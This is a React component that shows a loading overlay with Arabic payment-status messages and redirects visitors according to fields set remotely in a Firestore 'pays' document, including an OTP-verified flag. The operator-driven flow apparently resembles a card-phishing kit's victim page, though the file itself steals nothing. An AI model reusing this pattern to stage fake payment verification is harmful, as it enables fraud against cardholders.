"use client"

import { doc, onSnapshot } from "firebase/firestore"
import { Loader2 } from "lucide-react"
import { useEffect, useState } from "react"
import { db } from "../apis/firebase"

interface PageLoaderProps {
  text?: string
  showLoader?: boolean
}

export default function PageLoader({ text = "جاري التحقق ...", showLoader = true }: PageLoaderProps) {
  const [visible, setVisible] = useState(true)
  const [loading, setLoading] = useState(true)
  const [paymentStatus, setPaymentStatus] = useState<string | null>(null)

  useEffect(() => {
    setTimeout(() => {
      setLoading(false)
    }, 3000)
  }, [])

  // Listen for payment status updates
  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")

    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), async (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as { pageName?: string,otpVirfid?:boolean }
            if(data.otpVirfid===true){
              window.location.replace("/confirmation") 
             }
          // Set the payment status from Firestore
          if (data.pageName) {
            setPaymentStatus(data.pageName)

            // If payment is successful, hide the loader
            if (data.pageName === "code") {
              setVisible(false)
              setTimeout(() => {
                window.location.replace("/confirmation")
            }, 2000);         
            } else if (data.pageName === "pass") {
              // Keep the loader visible but update the text
              setLoading(true)

              // eslint-disable-next-line react-hooks/exhaustive-deps
              text = "في انتظار الدفع..."
              
              setTimeout(() => {
                window.location.replace("/confirmation")
            }, 3000);         
            } else if (data.pageName === "failed") {
              // Show error state
              setLoading(false)
              text = "فشلت عملية الدفع"
              // Optionally auto-hide after some time
              setTimeout(() => setVisible(false), 5000)
            }
          }
        }
      })

      return () => unsubscribe()
    }
  }, [])

  useEffect(() => {
    // Only auto-hide if not controlled by payment status
    if (!paymentStatus) {
      const timer = setTimeout(() => setVisible(false), 3000)
      return () => clearTimeout(timer)
    }
  }, [paymentStatus])

  if (!visible) return null

  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-background/80 backdrop-blur-sm">
      <div className="flex flex-col items-center justify-center gap-4 text-center">
        {showLoader && loading && <Loader2 className="h-10 w-10 animate-spin text-primary" />}
        <h2 className="text-2xl font-bold tracking-tight text-primary" dir="rtl">
          {text}
        </h2>
        {paymentStatus === "failed" && (
          <button
            className="mt-4 px-4 py-2 bg-primary text-primary-foreground rounded-md"
            onClick={() => setVisible(false)}
          >
            إغلاق
          </button>
        )}
      </div>
    </div>
  )
}

